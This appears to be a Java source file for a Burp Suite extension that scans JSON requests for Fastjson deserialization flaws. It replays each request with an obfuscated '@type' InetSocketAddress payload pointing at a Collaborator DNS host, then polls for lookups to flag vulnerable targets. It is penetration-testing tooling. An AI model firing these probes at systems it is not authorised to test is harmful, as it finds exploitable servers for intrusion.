package jrcet.frame.Scanner.Fastjson;

import burp.MyRegisterHttpHandler;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.CollaboratorPayload;
import burp.api.montoya.collaborator.Interaction;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.http.handler.HttpRequestToBeSent;
import burp.api.montoya.http.handler.HttpResponseReceived;
import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.internal.ObjectFactoryLocator;
import diycomponents.DiyJLogTable;
import help.Helper;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.locks.ReentrantLock;

import static burp.MyExtender.*;
import static jrcet.frame.Scanner.Fastjson.FastjsonComponent.FastjsonComponentPanel;

public class Fastjson {

    private static final HashMap<String, Integer> ColumnMap =  new HashMap<>() {
        {
            put("#", 0);
            put("Tool", 1);
            put("Method", 2);
            put("Host", 3);
            put("Path", 4);
            put("Code", 5);
            put("Length", 6);
            put("requestTime", 7);
            put("responseTime", 8);
            put("DnsLog", 9);
            put("FastJson", 10);
        }
    };


    public static final String FASTJSON = "FASTJSON";
    public static String FastjsonLoggerTableSerialNumber = "0";

    private static final ReentrantLock FastjsonCheckSerialNumberLock = new ReentrantLock();
    public static ArrayList<String> FastjsonCheckUrlList = new ArrayList<>();
    public static HashMap<String, FastjsonTableEntry> FastjsonLoggerTableEntryMap = new HashMap<>();

    public static boolean FastjsonCheck = false;

    public static String fastjsonCheckRequest(HttpRequestToBeSent requestToBeSent){

        if(!Fastjson.check(requestToBeSent)) return "";

        String serialNumber = getSpringbootTableSerialNumber();
        String requestHost   = requestToBeSent.httpService().host();
        String requestMethod = requestToBeSent.method();
        String requestTool   = requestToBeSent.toolSource().toolType().toolName();
        String requestPath   = requestToBeSent.path();
        String requestTime   = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date());
        String[] inf         = new String[]{
                serialNumber,
                requestTool,
                requestMethod,
                requestHost,
                requestPath,
                "",
                "",
                requestTime,
                "",
                "",
                ""
        };

        ((DefaultTableModel)getFastjsonLoggerTable().getModel()).addRow(inf);

        FastjsonTableEntry rowEntry = new FastjsonTableEntry(inf);
        rowEntry.setRawRequest(requestToBeSent);
        rowEntry.setRowIndex(getFastjsonLoggerTable().getRowByValue(serialNumber));

        FastjsonLoggerTableEntryMap.put(serialNumber,rowEntry);

        return FASTJSON+serialNumber;
    }

    public static void fastjsonCheckResponse(HttpResponseReceived responseReceived, String fastjsonSerialNumber){

        String randomString   = Helper.createRandomString(8);
        String responseCode   = Integer.toString(responseReceived.statusCode());
        int    responseLen    = responseReceived.body().length();
        String responseLength = Integer.toString(responseLen);
        String responseTime   = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date());


        HttpResponse simplifyHighAuthhttpResponse = responseLen<5000?responseReceived:responseReceived.withBody(responseReceived.body().subArray(0, 5000));

        CollaboratorClient  collaboratorClient  = BurpAPI.collaborator().createClient();
        CollaboratorPayload collaboratorPayload = collaboratorClient.generatePayload(randomString);

        setFastjsonLoggerTableValueAt(
                responseLength,
                FastjsonLoggerTableEntryMap.get(fastjsonSerialNumber).getRowIndex(),
                "Length"
        );
        setFastjsonLoggerTableValueAt(
                responseTime,
                FastjsonLoggerTableEntryMap.get(fastjsonSerialNumber).getRowIndex(),
                "responseTime"
        );
        setFastjsonLoggerTableValueAt(
                collaboratorPayload.toString(),
                FastjsonLoggerTableEntryMap.get(fastjsonSerialNumber).getRowIndex(),
                "DnsLog"
        );
        setFastjsonLoggerTableValueAt(
                responseCode,
                FastjsonLoggerTableEntryMap.get(fastjsonSerialNumber).getRowIndex(),
                "Code"
        );


        FastjsonLoggerTableEntryMap.get(fastjsonSerialNumber).setCode(responseCode);
        FastjsonLoggerTableEntryMap.get(fastjsonSerialNumber).setLength(responseLength);
        FastjsonLoggerTableEntryMap.get(fastjsonSerialNumber).setResponseTime(responseTime);
        FastjsonLoggerTableEntryMap.get(fastjsonSerialNumber).setRawResponse(simplifyHighAuthhttpResponse);
        FastjsonLoggerTableEntryMap.get(fastjsonSerialNumber).setDNSClient(collaboratorClient);
        FastjsonLoggerTableEntryMap.get(fastjsonSerialNumber).setDNSPayload(collaboratorPayload);

        FastjsonCheckUrlList.add(FastjsonLoggerTableEntryMap.get(fastjsonSerialNumber).getRawRequest().url());

        String fastjsonRequestBody  =  ("\ufeff{,/*aab*/,'x_' : {/*aab*/\"@type\":\"java.net.InetSocketAddress\"{\"address\":/*aab*/,/*aa\"b*/ \"val\" :\""+collaboratorPayload+"\"}}}");
        HttpRequest fastjsonRequest = FastjsonLoggerTableEntryMap.get(fastjsonSerialNumber).getRawRequest().withBody(ByteArray.byteArray(fastjsonRequestBody.getBytes(StandardCharsets.UTF_8)));

        new MyRegisterHttpHandler.checkWorker("fastjson", fastjsonSerialNumber, fastjsonRequest).execute();

        new dnslogWorker(fastjsonSerialNumber).execute();
    }
    public static class dnslogWorker extends SwingWorker<Void, Void>{

        public String serialNumber;

        public dnslogWorker(String requestNumber){
            this.serialNumber = requestNumber;
        }
        @Override
        protected Void doInBackground() throws Exception {
            CollaboratorClient collaboratorClient   = FastjsonLoggerTableEntryMap.get(serialNumber).getDNSClient();
            CollaboratorPayload collaboratorPayload = FastjsonLoggerTableEntryMap.get(serialNumber).getDNSPayload();
            List<Interaction> interactionList;

            for(int i=0; i<20; i++){

                interactionList = collaboratorClient.getInteractions(ObjectFactoryLocator.FACTORY.interactionIdFilter(collaboratorPayload.id().toString()));
                if(interactionList.size()!=0){
                    setFastjsonLoggerTableValueAt(
                            "True",
                            FastjsonLoggerTableEntryMap.get(serialNumber).getRowIndex(),
                            "FastJson"
                    );
                    break;
                }
                Thread.sleep(1000);
            }
            return null;
        }
    }

    public static boolean check(HttpRequestToBeSent requestToBeSent){

        List<HttpHeader> httpHeaders = requestToBeSent.headers();
        for(HttpHeader httpHeader: httpHeaders){
            if(Objects.equals(httpHeader.name().toLowerCase(), "content-type") && httpHeader.value().toLowerCase().contains("application/json")){
                return true;
            }
        }
        return false;
    }

    public static DiyJLogTable getFastjsonLoggerTable(){
        return (DiyJLogTable) Helper.getComponent(FastjsonComponentPanel, "FastjsonLoggerTable");
    }

    public static void setFastjsonLoggerTableValueAt(String value,Integer rowIndex, String ColumnName){
        getFastjsonLoggerTable().getModel().setValueAt(value, rowIndex, ColumnMap.get(ColumnName));
    }

    public static String getFastjsonSerialNumber(int row){
        return (String) getFastjsonLoggerTable().getValueAt(row,0);
    }


    private static String getSpringbootTableSerialNumber() {
        FastjsonCheckSerialNumberLock.lock();
        FastjsonLoggerTableSerialNumber = Integer.toString(Integer.parseInt(FastjsonLoggerTableSerialNumber)+1);
        FastjsonCheckSerialNumberLock.unlock();

        return FastjsonLoggerTableSerialNumber;
    }

    public static void clearFastjsonTable() {
        ((DefaultTableModel)getFastjsonLoggerTable().getModel()).setRowCount(0);
        FastjsonLoggerTableSerialNumber = "0";
        FastjsonLoggerTableEntryMap.clear();
    }
}
